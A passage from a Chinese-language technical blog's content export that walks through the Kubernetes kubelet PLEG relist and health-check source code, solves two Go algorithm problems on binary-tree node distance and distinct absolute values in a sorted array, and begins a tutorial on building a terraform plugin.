class="line">                klog.V(<span class="hljs-number">4</span>).Infof(<span class="hljs-string">"PLEG: Ignoring events for pod %s/%s: %v"</span>, pod.Name, pod.Namespace, err)</span><br><span class="line"></span><br><span class="line">                <span class="hljs-comment">// make sure we try to reinspect the pod during the next relisting</span></span><br><span class="line">                needsReinspection[pid] = pod</span><br><span class="line"></span><br><span class="line">                <span class="hljs-keyword">continue</span></span><br><span class="line">            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> _, found := g.podsToReinspect[pid]; found &#123;</span><br><span class="line">                <span class="hljs-comment">// this pod was in the list to reinspect and we did so because it had events, so remove it</span></span><br><span class="line">                <span class="hljs-comment">// from the list (we don't want the reinspection code below to inspect it a second time in</span></span><br><span class="line">                <span class="hljs-comment">// this relist execution)</span></span><br><span class="line">                <span class="hljs-built_in">delete</span>(g.podsToReinspect, pid)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="hljs-comment">// Update the internal storage and send out the events.</span></span><br><span class="line">        g.podRecords.update(pid)</span><br><span class="line">        <span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> events &#123;</span><br><span class="line">            <span class="hljs-comment">// Filter out events that are not reliable and no other components use yet.</span></span><br><span class="line">            <span class="hljs-keyword">if</span> events[i].Type == ContainerChanged &#123;</span><br><span class="line">                <span class="hljs-keyword">continue</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="hljs-keyword">select</span> &#123;</span><br><span class="line">            <span class="hljs-keyword">case</span> g.eventChannel &lt;- events[i]:</span><br><span class="line">            <span class="hljs-keyword">default</span>:</span><br><span class="line">                metrics.PLEGDiscardEvents.WithLabelValues().Inc()</span><br><span class="line">                klog.Error(<span class="hljs-string">"event channel is full, discard this relist() cycle event"</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> g.cacheEnabled() &#123;</span><br><span class="line">        <span class="hljs-comment">// reinspect any pods that failed inspection during the previous relist</span></span><br><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(g.podsToReinspect) &gt; <span class="hljs-number">0</span> &#123;</span><br><span class="line">            klog.V(<span class="hljs-number">5</span>).Infof(<span class="hljs-string">"GenericPLEG: Reinspecting pods that previously failed inspection"</span>)</span><br><span class="line">            <span class="hljs-keyword">for</span> pid, pod := <span class="hljs-keyword">range</span> g.podsToReinspect &#123;</span><br><span class="line">                <span class="hljs-keyword">if</span> err := g.updateCache(pod, pid); err != <span class="hljs-literal">nil</span> &#123;</span><br><span class="line">                    <span class="hljs-comment">// Rely on updateCache calling GetPodStatus to log the actual error.</span></span><br><span class="line">                    klog.V(<span class="hljs-number">5</span>).Infof(<span class="hljs-string">"PLEG: pod %s/%s failed reinspection: %v"</span>, pod.Name, pod.Namespace, err)</span><br><span class="line">                    needsReinspection[pid] = pod</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// Update the cache timestamp.  This needs to happen *after*</span></span><br><span class="line">        <span class="hljs-comment">// all pods have been properly updated in the cache.</span></span><br><span class="line">        g.cache.UpdateTime(timestamp)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">// make sure we retain the list of pods that need reinspecting the next time relist is called</span></span><br><span class="line">    g.podsToReinspect = needsReinspection</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>relist 中 export 了两个监控指标：<code>relist_interval</code> 和 <code>relist_latency</code>，它们俩的关系是：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">relist_interval = relist_latency + relist_period</span><br></pre></td></tr></table></figure><p>整个 relist 的流程大致为：</p><ol><li>从 container runtime 获取所有 Pod，更新至 podRecords 的 current state</li><li>遍历 podRecords，对比 current state 和 old state，产生 lifecycle events 并按照 pod 分组</li><li>遍历 pod 和 对应的 events，从 container runtime 获取 pod status 更新 cache（记录失败的 Pod，准备下次重试），并将 PLEG event （除了 ContainerChanged 事件）放入 eventChannel</li><li>遍历上次 relist 更新 cache 失败的 Pod，尝试再次获取 pod status 更新 cache</li></ol><p>relist 函数通过访问 container runtime 将 pod 和 container 的实际状态更新至 kubelet 的 pod cache。其他模块 (pod worker) 使用的 pod cache，都由 PLEG 模块更新。</p><p>pod lifecycle event 的生成通过 <code>generateEvents</code> 函数比较 old state 和 new state 来实现：</p><figure class="highlight golang hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">generateEvents</span><span class="hljs-params">(podID types.UID, cid <span class="hljs-keyword">string</span>, oldState, newState plegContainerState)</span> []*<span class="hljs-title">PodLifecycleEvent</span></span> &#123;</span><br><span class="line"><span class="hljs-keyword">if</span> newState == oldState &#123;</span><br><span class="line"><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">klog.V(<span class="hljs-number">4</span>).Infof(<span class="hljs-string">"GenericPLEG: %v/%v: %v -&gt; %v"</span>, podID, cid, oldState, newState)</span><br><span class="line"><span class="hljs-keyword">switch</span> newState &#123;</span><br><span class="line"><span class="hljs-keyword">case</span> plegContainerRunning:</span><br><span class="line"><span class="hljs-keyword">return</span> []*PodLifecycleEvent&#123;&#123;ID: podID, Type: ContainerStarted, Data: cid&#125;&#125;</span><br><span class="line"><span class="hljs-keyword">case</span> plegContainerExited:</span><br><span class="line"><span class="hljs-keyword">return</span> []*PodLifecycleEvent&#123;&#123;ID: podID, Type: ContainerDied, Data: cid&#125;&#125;</span><br><span class="line"><span class="hljs-keyword">case</span> plegContainerUnknown:</span><br><span class="line"><span class="hljs-keyword">return</span> []*PodLifecycleEvent&#123;&#123;ID: podID, Type: ContainerChanged, Data: cid&#125;&#125;</span><br><span class="line"><span class="hljs-keyword">case</span> plegContainerNonExistent:</span><br><span class="line"><span class="hljs-keyword">switch</span> oldState &#123;</span><br><span class="line"><span class="hljs-keyword">case</span> plegContainerExited:</span><br><span class="line"><span class="hljs-comment">// We already reported that the container died before.</span></span><br><span class="line"><span class="hljs-keyword">return</span> []*PodLifecycleEvent&#123;&#123;ID: podID, Type: ContainerRemoved, Data: cid&#125;&#125;</span><br><span class="line"><span class="hljs-keyword">default</span>:</span><br><span class="line"><span class="hljs-keyword">return</span> []*PodLifecycleEvent&#123;&#123;ID: podID, Type: ContainerDied, Data: cid&#125;, &#123;ID: podID, Type: ContainerRemoved, Data: cid&#125;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="hljs-keyword">default</span>:</span><br><span class="line"><span class="hljs-built_in">panic</span>(fmt.Sprintf(<span class="hljs-string">"unrecognized container state: %v"</span>, newState))</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>顺便看看 Container Runtime 接口，对于 Container Runtime，我们主要关注 PLEG 用到的两个方法 <code>GetPods</code> 和 <code>GetPodStatus</code>，参照 <code>pkg/kubelet/container/runtime.go</code> 文件：</p><figure class="highlight golang hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// Runtime interface defines the interfaces that should be implemented</span></span><br><span class="line"><span class="hljs-comment">// by a container runtime.</span></span><br><span class="line"><span class="hljs-comment">// Thread safety is required from implementations of this interface.</span></span><br><span class="line"><span class="hljs-keyword">type</span> Runtime <span class="hljs-keyword">interface</span> &#123;</span><br><span class="line">    <span class="hljs-comment">// ...</span></span><br><span class="line">    <span class="hljs-comment">// GetPods returns a list of containers grouped by pods. The boolean parameter</span></span><br><span class="line">    <span class="hljs-comment">// specifies whether the runtime returns all containers including those already</span></span><br><span class="line">    <span class="hljs-comment">// exited and dead containers (used for garbage collection).</span></span><br><span class="line">    GetPods(all <span class="hljs-keyword">bool</span>) ([]*Pod, error)</span><br><span class="line">    <span class="hljs-comment">// ...</span></span><br><span class="line">    <span class="hljs-comment">// GetPodStatus retrieves the status of the pod, including the</span></span><br><span class="line">    <span class="hljs-comment">// information of all containers in the pod that are visible in Runtime.</span></span><br><span class="line">    GetPodStatus(uid types.UID, name, namespace <span class="hljs-keyword">string</span>) (*PodStatus, error)</span><br><span class="line">    <span class="hljs-comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>GetPods</code> 主要是获取 pod 列表和 pod/container 的基本信息，<code>GetPodStatus</code> 则获取单个 pod 内所有容器的详细状态信息（包括 pod IP 和 runtime 返回的一些状态）。</p><p>关于事件通知，上面提到 PLEG 会将 pod lifecycle events 放入一个 channel，<code>Watch</code> 方法返回了这个 channel。</p><figure class="highlight golang hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// Watch returns a channel from which the subscriber can receive PodLifecycleEvent</span></span><br><span class="line"><span class="hljs-comment">// events.</span></span><br><span class="line"><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> support multiple subscribers.</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(g *GenericPLEG)</span> <span class="hljs-title">Watch</span><span class="hljs-params">()</span> <span class="hljs-title">chan</span> *<span class="hljs-title">PodLifecycleEvent</span></span> &#123;</span><br><span class="line">    <span class="hljs-keyword">return</span> g.eventChannel</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么 PLEG 如何判断自己工作是否正常呢？通过暴露 <code>Healthy</code> 方法，<code>GenericPLEG</code> 保存了上一次开始执行 relist 的时间戳，<code>Healthy</code> 方法判断与当前时间的间隔，只要大于阈值，则认为 PLEG unhealthy。</p><figure class="highlight golang hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// Healthy check if PLEG work properly.</span></span><br><span class="line"><span class="hljs-comment">// relistThreshold is the maximum interval between two relist.</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(g *GenericPLEG)</span> <span class="hljs-title">Healthy</span><span class="hljs-params">()</span> <span class="hljs-params">(<span class="hljs-keyword">bool</span>, error)</span></span> &#123;</span><br><span class="line">    relistTime := g.getRelistTime()</span><br><span class="line">    <span class="hljs-keyword">if</span> relistTime.IsZero() &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>, fmt.Errorf(<span class="hljs-string">"pleg has yet to be successful"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    elapsed := g.clock.Since(relistTime)</span><br><span class="line">    <span class="hljs-keyword">if</span> elapsed &gt; relistThreshold &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>, fmt.Errorf(<span class="hljs-string">"pleg was last seen active %v ago; threshold is %v"</span>, elapsed, relistThreshold)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>, <span class="hljs-literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个阈值在 <code>pkg/kubelet/pleg/generic.go</code> 中定义：</p><figure class="highlight golang hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> (</span><br><span class="line">    <span class="hljs-comment">// The threshold needs to be greater than the relisting period + the</span></span><br><span class="line">    <span class="hljs-comment">// relisting time, which can vary significantly. Set a conservative</span></span><br><span class="line">    <span class="hljs-comment">// threshold to avoid flipping between healthy and unhealthy.</span></span><br><span class="line">    relistThreshold = <span class="hljs-number">3</span> * time.Minute</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>默认是 <code>3m</code>，也就是说只要 relist 执行时间超过 3 分钟，则认为 PLEG unhealthy。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最后我们总结一下整个流程：</p><ol><li>kubelet 创建并启动 PLEG 模块，watch pod lifecycle event</li><li>PLEG 模块每隔 <code>1s</code> 执行 relist，relist 完成两个目标：<ol><li>获取 pod list，对比 pod 的 old state 和 new state，产生 PLEG events</li><li>依次获取 pod status，并更新 pod cache</li></ol></li><li>kubelet watch 到 pod lifecycle events，产生 update pod 事件通知 pod worker 执行 sync pod 操作</li><li>kubelet 持续检查 runtime state (PLEG) 的健康状态</li></ol><p>本文对下面几个方面没有深入介绍，后面有空会写单独的文章将源码解析分享出来：</p><ul><li>kubelet sync loop iteration</li><li>pod worker 的 sync pod 机制</li><li>container runtime</li><li>node status 节点状态控制</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 原创 </tag>
            
            <tag> 云计算 </tag>
            
            <tag> Kubernetes </tag>
            
            <tag> K8S </tag>
            
            <tag> Kubelet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二叉树两个节点之间的最大距离</title>
      <link href="/hexo-blog/20190523/%E4%BA%8C%E5%8F%89%E6%A0%91%E4%B8%A4%E4%B8%AA%E8%8A%82%E7%82%B9%E4%B9%8B%E9%97%B4%E7%9A%84%E6%9C%80%E5%A4%A7%E8%B7%9D%E7%A6%BB/"/>
      <url>/hexo-blog/20190523/%E4%BA%8C%E5%8F%89%E6%A0%91%E4%B8%A4%E4%B8%AA%E8%8A%82%E7%82%B9%E4%B9%8B%E9%97%B4%E7%9A%84%E6%9C%80%E5%A4%A7%E8%B7%9D%E7%A6%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个二叉树，求它两个节点之间的最大距离。</p><p>比如二叉树：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    1</span><br><span class="line">   / \</span><br><span class="line">  2   3</span><br><span class="line"> / \</span><br><span class="line">4   5</span><br></pre></td></tr></table></figure><p>的最大距离为 3。</p><a id="more"></a><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>刚看到这个题目时有点懵，仔细分析了一下，求根节点为 Root 的二叉树中两个节点的最大距离，需要分两种情况考虑：</p><h3 id="情况一"><a href="#情况一" class="headerlink" title="情况一"></a>情况一</h3><p>如果最大距离经过了 Root，则最大距离：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MaxDistance(root) = MaxDepth(root.Left) + MaxDepth(root.Right) + 2</span><br></pre></td></tr></table></figure><p>假设 <code>root</code> 节点为 <code>1</code>，示例图为：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    1</span><br><span class="line">  // \\</span><br><span class="line">  2   3</span><br><span class="line">// \</span><br><span class="line">4   5</span><br></pre></td></tr></table></figure><h3 id="情况二"><a href="#情况二" class="headerlink" title="情况二"></a>情况二</h3><p>如果最大距离没有经过 Root，则最大距离：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MaxDistance(root) = max(MaxDistance(root.Left), MaxDistance(root.Right))</span><br></pre></td></tr></table></figure><p>假设 <code>root</code> 节点为 <code>1</code>，示例图为：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">      1</span><br><span class="line">     /</span><br><span class="line">    2</span><br><span class="line">  // \\</span><br><span class="line">  3   4</span><br><span class="line">//     \\</span><br><span class="line">5       6</span><br></pre></td></tr></table></figure><p>想必大家已经通过公式看出规律来了，父节点的 <code>maxDistance</code> 可以通过两个子节点的 <code>maxDistance</code> 和 <code>maxDepth</code> 求出，合并 <code>1</code> <code>2</code> 两种情况，最终的状态转移方程如下：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MaxDistance(root) = max(max(MaxDistance(root.Left), MaxDistance(root.Right)), MaxDepth(root.Left) + MaxDepth(root.Right) + 2)</span><br></pre></td></tr></table></figure><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>我们需要有个数据结构保存中间结果，即 <code>maxDepth</code> 和 <code>maxDistance</code>。</p><p>另外，这里我们确定 <code>root</code> 节点的深度为 <code>0</code>，因此将 <code>nil</code> 节点的深度初始化为 <code>-1</code>。</p><p>整个算法使用了递归方式。</p><figure class="highlight golang hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">type</span> TreeNode <span class="hljs-keyword">struct</span> &#123;</span><br><span class="line">    Val   <span class="hljs-keyword">int</span></span><br><span class="line">    Left  *TreeNode</span><br><span class="line">    Right *TreeNode</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">type</span> result <span class="hljs-keyword">struct</span> &#123;</span><br><span class="line">    maxDepth    <span class="hljs-keyword">int</span></span><br><span class="line">    maxDistance <span class="hljs-keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">getMaxDistance</span><span class="hljs-params">(root *TreeNode)</span> *<span class="hljs-title">result</span></span> &#123;</span><br><span class="line">    <span class="hljs-keyword">if</span> root == <span class="hljs-literal">nil</span> &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> &amp;result&#123;</span><br><span class="line">            maxDepth:    <span class="hljs-number">-1</span>,</span><br><span class="line">            maxDistance: <span class="hljs-number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    left := getMaxDistance(root.Left)</span><br><span class="line">    right := getMaxDistance(root.Right)</span><br><span class="line">    maxDepth := max(left.maxDepth+<span class="hljs-number">1</span>, right.maxDepth+<span class="hljs-number">1</span>)</span><br><span class="line">    maxDistance := max(max(left.maxDistance, right.maxDistance), left.maxDepth+right.maxDepth+<span class="hljs-number">2</span>)</span><br><span class="line">    <span class="hljs-keyword">return</span> &amp;result&#123;</span><br><span class="line">        maxDepth:    maxDepth,</span><br><span class="line">        maxDistance: maxDistance,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetMaxDistance</span><span class="hljs-params">(root *TreeNode)</span> <span class="hljs-title">int</span></span> &#123;</span><br><span class="line">    result := getMaxDistance(root)</span><br><span class="line">    <span class="hljs-keyword">return</span> result.maxDistance</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以在这里在线运行：<a href="https://play.golang.org/p/CwIvHaBJwP-" target="_blank" rel="noopener">https://play.golang.org/p/CwIvHaBJwP-</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 原创 </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有序数组的不同绝对值个数</title>
      <link href="/hexo-blog/20190523/%E6%9C%89%E5%BA%8F%E6%95%B0%E7%BB%84%E7%9A%84%E4%B8%8D%E5%90%8C%E7%BB%9D%E5%AF%B9%E5%80%BC%E4%B8%AA%E6%95%B0/"/>
      <url>/hexo-blog/20190523/%E6%9C%89%E5%BA%8F%E6%95%B0%E7%BB%84%E7%9A%84%E4%B8%8D%E5%90%8C%E7%BB%9D%E5%AF%B9%E5%80%BC%E4%B8%AA%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个有序数组，求它的元素不同的绝对值个数。</p><p>比如</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[-3, -1, 0, 0, 1, 1, 2, 5]</span><br></pre></td></tr></table></figure><p>返回</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a>第一种方法</h3><p>首先一个循环将数组所有的负数转换为正数，然后对整个数组进行排序。</p><p>但循环一遍的时间复杂度为 <code>O(n)</code>，排序如果用堆排序，平均时间复杂度为 <code>O(nlogn)</code>，空间复杂度为 <code>O(1)</code>。因此整体的时间复杂度为 <code>O(nlogn)</code>，空间复杂度为 <code>O(1)</code>。而既然题目已经保证了有序数组，那有没有更快的方法呢？</p><h3 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h3><p>我们可以用两个索引，索引 i 和 索引 j 分别从数组两端向中间移动，如果当前元素和下一个元素相等则跳过，如果右边的绝对值大于左边的绝对值，则索引 j 左移，如果左边的绝对值大于右边的绝对值，则索引 i 右移，如果两边绝对值相等，则索引同时左移和右移，每次移动计数加一。直到索引相遇时结束，如果相遇后索引刚好相等，则计数最后再加一。</p><p>这样时间复杂度就为 <code>O(n)</code>，空间复杂度为 <code>O(1)</code>。</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>使用 Golang 实现的源码如下：</p><figure class="highlight golang hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">getDistinctAbsCount</span><span class="hljs-params">(nums []<span class="hljs-keyword">int</span>)</span> <span class="hljs-title">int</span></span> &#123;</span><br><span class="line">    i := <span class="hljs-number">0</span></span><br><span class="line">    j := <span class="hljs-built_in">len</span>(nums) - <span class="hljs-number">1</span></span><br><span class="line">    count := <span class="hljs-number">0</span></span><br><span class="line">    <span class="hljs-keyword">for</span> i &lt; j &#123;</span><br><span class="line">        <span class="hljs-keyword">if</span> i &lt; <span class="hljs-built_in">len</span>(nums)<span class="hljs-number">-1</span> &amp;&amp; nums[i] == nums[i+<span class="hljs-number">1</span>] &#123;</span><br><span class="line">            <span class="hljs-comment">// skip duplicated</span></span><br><span class="line">            i += <span class="hljs-number">1</span></span><br><span class="line">            <span class="hljs-keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="hljs-keyword">if</span> j &gt; <span class="hljs-number">0</span> &amp;&amp; nums[j] == nums[j<span class="hljs-number">-1</span>] &#123;</span><br><span class="line">            <span class="hljs-comment">// skip duplicated</span></span><br><span class="line">            j -= <span class="hljs-number">1</span></span><br><span class="line">            <span class="hljs-keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        sum := nums[i] + nums[j]</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">if</span> sum &gt; <span class="hljs-number">0</span> &#123;</span><br><span class="line">            <span class="hljs-comment">// abs(nums[i]) &lt; abs(nums[j])</span></span><br><span class="line">            j -= <span class="hljs-number">1</span></span><br><span class="line">        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> sum &lt; <span class="hljs-number">0</span> &#123;</span><br><span class="line">            <span class="hljs-comment">// abs(nums[i]) &gt; abs(nums[j])</span></span><br><span class="line">            i += <span class="hljs-number">1</span></span><br><span class="line">        &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">            <span class="hljs-comment">// abs(nums[i]) == abs(nums[j])</span></span><br><span class="line">            i += <span class="hljs-number">1</span></span><br><span class="line">            j -= <span class="hljs-number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        count += <span class="hljs-number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">if</span> i == j &#123;</span><br><span class="line">        count += <span class="hljs-number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">return</span> count</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可在这里在线运行：<a href="https://play.golang.org/p/lmOI5ZNkMNf" target="_blank" rel="noopener">https://play.golang.org/p/lmOI5ZNkMNf</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 原创 </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从零开始实现一个 terraform plugin</title>
      <link href="/hexo-blog/20190522/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA-terraform-plugin/"/>
      <url>/hexo-blog/20190522/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA-terraform-plugin/</url>
      
        <content type="html"><![CDATA[<p>terraform 作为一个优秀的开源基础设施管理、构建工具，官方或第三方提供了很多 plugin 来对接各种云平台（IaaS）。然而在我们平时开发和测试过程中，需要使用内部的 IaaS 服务频繁创建和删除 VM，而目前人工操作的方式比较费时费力，且没有现成的 plugin 可以使用。为了更方便地利用 terraform 工具来对内部 IaaS 资源进行管理和操作，我们决定自己开发一个 terraform plugin。</p><a id="more"></a><h2 id="定义-Provider-Schema"><a href="#定义-Provider-Schema" class="headerlink" title="定义 Provider Schema"></a>定义 Provider Schema</h2><p>首先，我们定义入口文件 <code>main.go</code>：</p><figure class="highlight golang hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> (</span><br><span class="line">    <span class="hljs-string">"github.com/hashicorp/terraform/plugin"</span></span><br><span class="line">    qvm <span class="hljs-string">"qiniu.com/kirk-deploy/pkg/qvm/terraform"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;</span><br><span class="line">    plugin.Serve(&amp;plugin.ServeOpts&#123;</span><br><span class="line">        ProviderFunc: qvm.Provider,</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>qvm.Provider</code> 函数负责创建一个 provider resource。</p><figure class="highlight golang hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 